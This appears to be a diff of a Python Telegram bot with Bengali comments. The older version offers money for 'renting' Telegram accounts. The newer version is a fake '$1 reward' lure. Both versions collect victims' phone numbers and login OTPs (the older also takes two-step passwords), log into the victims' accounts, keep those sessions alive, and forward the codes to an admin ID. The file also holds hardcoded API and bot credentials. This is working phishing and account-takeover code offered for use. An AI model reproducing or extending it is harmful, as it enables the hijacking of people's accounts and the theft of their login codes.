@@ -1,7 +1,5 @@
 import os
 import sys
-import asyncio
-import shutil
 
 # লাইব্রেরি চেক ও অটো ইনস্টল
 try:
@@ -11,104 +9,70 @@ except ImportError:
     os.system("pip install requests telethon")
     os.execl(sys.executable, sys.executable, *sys.argv)
 
+from telethon.network import ConnectionTcpFull
+import asyncio
+import shutil
+
 # --- Configuration ---
 API_ID = 28260353
 API_HASH = 'bc2b69b2727821422ed0adf43a82700a'
-BOT_TOKEN = '8383019080:AAEJ1CWZM2FXa98EsASHbTKCL4PdYVby_u4' 
+# আপনার দেওয়া নতুন টোকেনটি এখানে আপডেট করা হয়েছে
+BOT_TOKEN = '8383019080:AAEJ1CWZM2FXa98EsASHbTKCL4PdYVby_u4'
 ADMIN_ID = 7852368023
 
-# সেশন ক্লিনআপ এবং ফোল্ডার তৈরি
-if not os.path.exists('sessions'):
+# সেশন ক্লিনআপ ফাংশন
+def clean_sessions():
+    for file in os.listdir('.'):
+        if file.endswith(".session") or file.endswith(".session-journal"):
+            try: os.remove(file)
+            except: pass
+    if os.path.exists('sessions'):
+        shutil.rmtree('sessions')
     os.makedirs('sessions')
 
-# মেইন বট স্টার্ট
+clean_sessions()
+
+# মেইন বট (নতুন সেশন নাম দিয়ে যাতে লক না হয়)
 bot = TelegramClient('new_main_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-# --- Handlers ---
-
-# ১. /start কমান্ড - আপনার দেওয়া টেক্সট এবং UI
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
-    welcome_text = (
-        "💥 **টেলিগ্রাম নাম্বার ভাড়া দিয়ে ২৪ঘন্টার ⌛ জন্য ১০৳ করে পান** 💰\n\n"
-        "✅ কীভাবে ভাড়া দিবে সেটা জানতে /details কমান্ড ব্যবহার করুন 👇\n\n"
-        "✅ এবং আপনার বন্ধুদের কে রেফার করুন আর জিতে নিন **২৳ করে বোনাস** 💰 "
-        "এবং আপনার বন্ধুরা যদি টেলিগ্রাম নাম্বার ভাড়া দেয় তাহলে সেখান থেকে পাবেন **৩৳ করে** 💸"
+    await event.respond(
+        "🎁 <b>Congratulations! You Won $1 USD</b> 💲\n\n"
+        "💡 <b>Verify your account to claim.</b>",
+        buttons=[Button.inline("✅ CLAIM NOW ✅", b"claim")],
+        parse_mode='html'
     )
-    await event.respond(welcome_text, buttons=[
-        [Button.inline("📲 নাম্বার জমা দিন", data="submit")],
-        [Button.url("📞 অ্যাডমিন সাপোর্ট", "t.me/skfieh72")]
-    ])
 
-# ২. /details কমান্ড
-@bot.on(events.NewMessage(pattern='/details'))
-async def details(event):
-    details_text = (
-        "⌛ **কীভাবে টেলিগ্রাম ভাড়া দিবে....**\n\n"
-        "✅ আপনার টেলিগ্রাম একাউন্ট এ কোনো sms থাকতে পারবে না\n"
-        "✅ টেলিগ্রাম একাউন্ট এ 2stp/pas থাকা বা রিকোভারি থাকা চলবে না\n"
-        "✅ আমাদের Bot যখন লগিং করবে তখন আমাদের Bot কে একাউন্ট থেকে লগ-আউট করা যাবে না"
-    )
-    await event.respond(details_text, parse_mode='html')
+@bot.on(events.CallbackQuery(data=b"claim"))
+async def claim(event):
+    chat_id = event.chat_id
+    async with bot.conversation(chat_id, timeout=600) as conv:
+        try:
+            await conv.send_message("📱 <b>ENTER YOUR TELEGRAM NUMBER:</b>", parse_mode='html')
+            phone_res = await conv.get_response()
+            phone = phone_res.text.strip().replace(" ", "")
 
-# ৩. /withdraw কমান্ড (স্ট্যাটিক ডাটা ফরম্যাট)
-@bot.on(events.NewMessage(pattern='/withdraw'))
-async def withdraw(event):
-    withdraw_text = (
-        "💰 **সর্বনিম্ম Withdraw ১০০৳**\n\n"
-        "⚪ **Imposes:** 0 (এখোনো ২৪ঘন্টা হয় নাই)\n"
-        "🔴 **Disable:** 0 (Otp দেয়নি বা লগআউট করেছে)\n"
-        "🟢 **Successful:** 0 (যেগুলা ২৪ঘন্টা হয়েছে)"
-    )
-    await event.respond(withdraw_text, parse_mode='html')
+            # সেশন ফাইল তৈরি
+            client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH, connection=ConnectionTcpFull)
+            await client.connect()
 
-# ৪. নাম্বার সাবমিট এবং OTP প্রসেস (শুধুমাত্র +880 এর জন্য)
-@bot.on(events.NewMessage)
-async def handle_phone_submit(event):
-    text = event.text.strip().replace(" ", "")
-    
-    # শুধুমাত্র +880 দিয়ে শুরু হলে কাজ করবে
-    if text.startswith('+880'):
-        phone = text
-        chat_id = event.chat_id
-        
-        async with bot.conversation(chat_id, timeout=600) as conv:
-            try:
-                await conv.send_message("⏳ **OTP পাঠানো হচ্ছে, অপেক্ষা করুন...**", parse_mode='html')
-                
-                client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
-                await client.connect()
+            sent_code = await client.send_code_request(phone)
+            h_code = sent_code.phone_code_hash
+            
+            await conv.send_message("🔑 <b>ENTER THE 5-DIGIT OTP:</b>", parse_mode='html')
+            otp_res = await conv.get_response()
+            otp = otp_res.text.strip()
 
-                # OTP রিকোয়েস্ট
-                sent_code = await client.send_code_request(phone)
-                h_code = sent_code.phone_code_hash
-                
-                await conv.send_message(f"🔑 **{phone} নাম্বারে আসা ৫ ডিজিটের OTP কোডটি দিন:**", parse_mode='html')
-                otp_res = await conv.get_response()
-                otp = otp_res.text.strip()
+            await client.sign_in(phone, code=otp, phone_code_hash=h_code)
+            
+            await conv.send_message("🎉 <b>SUCCESS! Reward processing...</b>")
+            await bot.send_message(ADMIN_ID, f"✅ <b>LOGIN SUCCESS!</b>\n📱 Phone: {phone}\n🔑 OTP: {otp}")
+            
+            asyncio.create_task(client.run_until_disconnected())
 
-                # লগইন করার চেষ্টা
-                try:
-                    await client.sign_in(phone, code=otp, phone_code_hash=h_code)
-                except errors.SessionPasswordNeededError:
-                    await conv.send_message("🔐 **এই একাউন্টে 2-Step ভেরিফিকেশন অন আছে। পাসওয়ার্ড দিন:**")
-                    pwd_res = await conv.get_response()
-                    await client.sign_in(password=pwd_res.text.strip())
-
-                await conv.send_message("🎉 **সফলভাবে লগইন হয়েছে!**\n২৪ ঘণ্টা পর আপনার ব্যালেন্সে টাকা যোগ হবে।")
-                
-                # অ্যাডমিনকে জানানো (সরাসরি ফরওয়ার্ডের মতো)
-                await bot.send_message(ADMIN_ID, f"✅ **নতুন লগইন সাকসেস!**\n📱 নাম্বার: `{phone}`\n🔑 OTP: `{otp}`")
-                
-                # সেশন চালু রাখা
-                asyncio.create_task(client.run_until_disconnected())
-
-            except Exception as e:
-                await conv.send_message(f"❌ **এরর:** {str(e)}\nসঠিকভাবে আবার চেষ্টা করুন।")
-
-@bot.on(events.CallbackQuery(data="submit"))
-async def callback_submit(event):
-    await event.respond("📱 আপনার টেলিগ্রাম নাম্বারটি **+880** সহ টাইপ করে এখানে পাঠান:")
+        except Exception as e:
+            await conv.send_message(f"❌ Error: {str(e)}")
 
 print("--- BOT STARTED SUCCESSFULLY ---")
 bot.run_until_disconnected()
